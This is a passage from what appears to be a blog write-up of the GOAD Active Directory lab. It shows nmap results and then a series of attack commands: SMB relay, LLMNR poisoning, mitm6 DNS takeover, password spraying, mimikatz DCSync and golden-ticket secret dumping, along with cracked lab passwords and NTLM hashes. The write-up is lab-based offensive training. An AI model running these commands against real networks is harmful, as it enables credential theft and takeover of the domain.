<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">NetBIOS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV03</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">DNS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">DNS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV03</span><span class="p">.</span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="nx">DNS_Tree_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Product_Version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">10.0.14393</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">SSL_Self_Signed_Fallback</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">37</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2055</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">37</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Terminal</span><span class="w"> </span><span class="nx">Services</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV03</span><span class="p">.</span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">26</span><span class="nx">T20</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">12</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">28</span><span class="nx">T20</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">12</span>
<span class="w">    </span><span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="mi">5986</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">http</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2016</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2016</span><span class="p">,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">vagrant</span><span class="o">-</span><span class="mi">2016</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2027</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">tls</span><span class="o">-</span><span class="nx">alpn</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">h2</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">http</span><span class="o">/</span><span class="m m-Double">1.1</span>
<span class="w">    </span><span class="nx">MAC</span><span class="w"> </span><span class="nx">Address</span><span class="p">:</span><span class="w"> </span><span class="nx">BC</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="nx">C2</span><span class="p">:</span><span class="mi">5</span><span class="nx">A</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OSs</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">,</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2008</span><span class="w"> </span><span class="nx">R2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2012</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>

<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb</span><span class="o">-</span><span class="nx">os</span><span class="o">-</span><span class="nx">discovery</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="nx">Standard</span><span class="w"> </span><span class="nx">Evaluation</span><span class="w"> </span><span class="mi">14393</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="nx">Standard</span><span class="w"> </span><span class="nx">Evaluation</span><span class="w"> </span><span class="m m-Double">6.3</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV03</span><span class="err">\</span><span class="nx">x00</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">Workgroup</span><span class="p">:</span><span class="w"> </span><span class="nx">ESSOS</span><span class="err">\</span><span class="nx">x00</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">System</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T10</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">27</span><span class="o">+</span><span class="mi">01</span><span class="p">:</span><span class="mi">00</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_clock</span><span class="o">-</span><span class="nx">skew</span><span class="p">:</span><span class="w"> </span><span class="nx">mean</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="mi">8</span><span class="nx">m34s</span><span class="p">,</span><span class="w"> </span><span class="nx">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">22</span><span class="nx">m38s</span><span class="p">,</span><span class="w"> </span><span class="nx">median</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_nbstat</span><span class="p">:</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">SRV03</span><span class="p">,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">user</span><span class="p">:</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">unknown</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">MAC</span><span class="p">:</span><span class="w"> </span><span class="nx">bc</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="nx">c2</span><span class="p">:</span><span class="mi">5</span><span class="nx">a</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Message</span><span class="w"> </span><span class="nx">signing</span><span class="w"> </span><span class="nx">enabled</span><span class="w"> </span><span class="nx">but</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">required</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">account_used</span><span class="p">:</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">blank</span><span class="p">&gt;</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">authentication_level</span><span class="p">:</span><span class="w"> </span><span class="nx">user</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">challenge_response</span><span class="p">:</span><span class="w"> </span><span class="nx">supported</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">message_signing</span><span class="p">:</span><span class="w"> </span><span class="nx">disabled</span><span class="w"> </span><span class="p">(</span><span class="nx">dangerous</span><span class="p">,</span><span class="w"> </span><span class="nx">but</span><span class="w"> </span><span class="k">default</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">27</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">start_date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">31</span>

<span class="w">    </span><span class="nx">Post</span><span class="o">-</span><span class="nx">scan</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">clock</span><span class="o">-</span><span class="nx">skew</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="mi">0</span><span class="nx">s</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="m m-Double">10.1.0.10</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="m m-Double">10.1.0.12</span>
<span class="w">    </span><span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">Tue</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">addresses</span><span class="w"> </span><span class="p">(</span><span class="mi">5</span><span class="w"> </span><span class="nx">hosts</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">82.23</span><span class="w"> </span><span class="nx">seconds</span>
</code></pre></div>
<h2 id="initial-attacks">Initial Attacks</h2>
<h3 id="smb-relay">SMB Relay</h3>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.1.0.0/24<span class="w"> </span>--gen-relay-list<span class="w"> </span>relay_list.txt
</code></pre></div>
<p>Result:</p>
<div class="highlight"><pre><span></span><code><span class="mf">10.1.0.23</span><span class="w">  </span>
<span class="mf">10.1.0.22</span>
</code></pre></div>
<p>Start <code>responder</code>:</p>
<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>./Responder.py<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-v
</code></pre></div>
<p>SMB relay with <code>ntlmrelayx</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-tf<span class="w"> </span>relay_list.txt<span class="w"> </span>-l<span class="w"> </span>dumps/loot<span class="w"> </span>-smb2support<span class="w"> </span>-socks<span class="w"> </span>--keep-relaying
</code></pre></div>
<p><img alt="north-llmnr-poisoning-smb-relay.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-llmnr-poisoning-smb-relay.png"/></p>
<h3 id="llmnr-poisoning">LLMNR Poisoning</h3>
<p>Poison DNS and capture NTLMv2 hashes:</p>
<div class="highlight"><pre><span></span><code>sudo ./Responder.py -I eth0 -v
</code></pre></div>
<p><img alt="north-llmnr-poisoning.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-llmnr-poisoning.png"/></p>
<p>Cracking the captured hashes:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</code></pre></div>
<p>Recovered the <code>robb.stark</code> password:</p>
<div class="highlight"><pre><span></span><code>sexywolfy
</code></pre></div>
<h3 id="dns-takeover-via-ipv6">DNS takeover via IPv6</h3>
<div class="highlight"><pre><span></span><code>sudo mitm6 -d north.sevenkingdoms.local -d sevenkingdoms.local -d essos.local
</code></pre></div>
<p><strong>Attacking winterfell</strong></p>
<p>Dump loot:</p>
<div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>attackerwpad.north.sevenkingdoms.local<span class="w"> </span>-t<span class="w"> </span>ldap://10.1.0.11<span class="w"> </span>-l<span class="w"> </span>dumps/loot
</code></pre></div>
<p><img alt="north-mitm6-relay.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-mitm6-relay.png"/></p>
<p><strong>Cannot create backdoor user due to constraint failing!</strong></p>
<h3 id="plaintext-password">Plaintext Password</h3>
<p>After enumerating users with <code>robb.stark</code>, a cleartext password for user <code>samwell.tarly</code> is found in the description property:</p>
<p><img alt="north-users-enumetation.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-users-enumetation.png"/></p>
<h3 id="password-spraying">Password Spraying</h3>
<h4 id="winterfell">WINTERFELL</h4>
<p>Using this <a href="https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1">script</a>, perform password spraying using the username as password:</p>
<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UsernameAsPassword</span>
</code></pre></div>
<p><img alt="north-password-spraying.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-password-spraying.png"/></p>
<h4 id="kingslanding">KINGSLANDING</h4>
<p>Using this <a href="https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1">script</a>, perform password spraying using the secret decrypted in <a href="https://ojack69.github.io/jacks-corner/ad/goad.html#shares-enumeration">Shares Enumeration</a>:</p>
<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Password</span> <span class="n">powerkingftw135</span>
</code></pre></div>
<p><img alt="sevenkingdoms-password-spraying.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-password-spraying.png"/></p>
<h2 id="credentials-dumping_2">Credentials Dumping</h2>
<h3 id="north">NORTH</h3>
<h4 id="donpapi">DonPAPI</h4>
<div class="highlight"><pre><span></span><code>donpapi<span class="w"> </span>collect<span class="w"> </span>-u<span class="w"> </span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>-d<span class="w"> </span>NORTH.local<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.1.0.11
</code></pre></div>
<p><img alt="north-dumping-credentials-donPAPI.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-dumping-credentials-donPAPI.png"/></p>
<p>Using relayed credentials:</p>
<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>donpapi<span class="w"> </span>collect<span class="w"> </span>--no-pass<span class="w"> </span>-u<span class="w"> </span>eddard.stark<span class="w"> </span>-d<span class="w"> </span>NORTH<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.1.0.22
</code></pre></div>
<p><img alt="north-smb-relay-credential-dumping.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-smb-relay-credential-dumping.png"/></p>
<p>By performing password spraying, the password <code>YouWillNotKerboroast1ngMeeeeee</code> belongs to <code>sql_svc</code></p>
<h4 id="mimikatz">Mimikatz</h4>
<p>With <code>eddard.stark</code> (domain admin):</p>
<div class="highlight"><pre><span></span><code>privilege::debug
lsadump::dcsync /user:arya.stark
</code></pre></div>
<p>Dumping NTLM hash: <code>4f622f4cd4284a887228940e2ff4e709</code></p>
<p><img alt="north-dumping-credentials-mimikatz-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-dumping-credentials-mimikatz-cracking.png"/></p>
<h3 id="kingslanding_2">KINGSLANDING</h3>
<p>Dump all secrets using golden ticket from <a href="https://ojack69.github.io/jacks-corner/ad/goad.html#child-domain-to-parent">Golden Ticket - Child domain to parent</a>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
</code></pre></div>
<p><img alt="sevenkingdoms-secretdumps-with-golden-ticket.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-secretdumps-with-golden-ticket.png"/></p>
<p>Crack dumped NTLM hashes with hashcat:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>sam_kingslanding.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</code></pre></div>
<p><img alt="sevenkingdoms-sam-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-sam-cracking.png"/></p>
<p>Cracked the following hashes:</p>
<div class="highlight"><pre><span></span><code><span class="n">cersei</span><span class="p">.</span><span class="nl">lannister</span><span class="p">:</span><span class="nl">c247f62516b53893c7addcf8c349954b</span><span class="p">:</span><span class="n">il0vejaime</span>
<span class="n">robert</span><span class="p">.</span><span class="nl">baratheon</span><span class="p">:</span><span class="mi">9029</span><span class="nl">cf007326107eb1c519c84ea60dbe</span><span class="p">:</span><span class="n">iamthekingoftheworld</span>
<span class="n">petyer</span><span class="p">.</span><span class="nl">baelish</span><span class="p">:</span><span class="mi">6</span><span class="nl">c439acfa121a821552568b086c8d210</span><span class="p">:</span><span class="nv">@littlefinger</span><span class="err">@</span>
<span class="n">joffrey</span><span class="p">.</span><span class="nl">baratheon</span><span class="p">:</span><span class="mi">3</span><span class="nl">b60abbc25770511334b3829866b08f1</span><span class="p">:</span><span class="mi">1</span><span class="n">killerlion</span>
</code></pre></div>
<h2 id="shares-enumeration_1">Shares Enumeration</h2>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>share
</code></pre></div>
<p><img alt="north-shares-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-shares-enumeration.png"/></p>
<p>An interesting share <code>NETLOGON</code> is found, containing two sensitive files:</p>
<ul>
<li><code>script.ps1</code>: contains cleartext password for the user </li>
</ul>
<p><img alt="north-script-ps1-content.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-script-ps1-content.png"/></p>
<ul>
<li><code>secret.ps1</code>: containing an encrypted secret but also the key.</li>
</ul>
<p><img alt="north-secret-ps1-content.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-secret-ps1-content.png"/></p>
<div class="highlight"><pre><span></span><code><span class="c"># cypher script  </span>
<span class="c"># $domain="sevenkingdoms.local"  </span>
<span class="c"># $EncryptionKeyBytes = New-Object Byte[] 32  </span>
<span class="c"># [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)  </span>
<span class="c"># $EncryptionKeyBytes | Out-File "encryption.key"  </span>
<span class="c"># $EncryptionKeyData = Get-Content "encryption.key"  </span>
<span class="c"># Read-Host -AsSecureString | ConvertFrom-SecureString -Key $EncryptionKeyData | Out-File -FilePath "secret.encrypted"  </span>

<span class="c"># secret stored :  </span>
<span class="nv">$keyData</span> <span class="p">=</span> <span class="n">177</span><span class="p">,</span> <span class="n">252</span><span class="p">,</span> <span class="n">228</span><span class="p">,</span> <span class="n">64</span><span class="p">,</span> <span class="n">28</span><span class="p">,</span> <span class="n">91</span><span class="p">,</span> <span class="n">12</span><span class="p">,</span> <span class="n">201</span><span class="p">,</span> <span class="n">20</span><span class="p">,</span> <span class="n">91</span><span class="p">,</span> <span class="n">21</span><span class="p">,</span> <span class="n">139</span><span class="p">,</span> <span class="n">255</span><span class="p">,</span> <span class="n">65</span><span class="p">,</span> <span class="n">9</span><span class="p">,</span> <span class="n">247</span><span class="p">,</span> <span class="n">41</span><span class="p">,</span> <span class="n">55</span><span class="p">,</span> <span class="n">164</span><span class="p">,</span> <span class="n">28</span><span class="p">,</span> <span class="n">75</span><span class="p">,</span> <span class="n">132</span><span class="p">,</span> <span class="n">143</span><span class="p">,</span> <span class="n">71</span><span class="p">,</span> <span class="n">62</span><span class="p">,</span> <span class="n">191</span><span class="p">,</span> <span class="n">211</span><span class="p">,</span> <span class="n">61</span><span class="p">,</span> <span class="n">154</span><span class="p">,</span> <span class="n">61</span><span class="p">,</span> <span class="n">216</span><span class="p">,</span> <span class="n">91</span>  
<span class="nv">$secret</span><span class="p">=</span><span class="s2">"76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA="</span>  

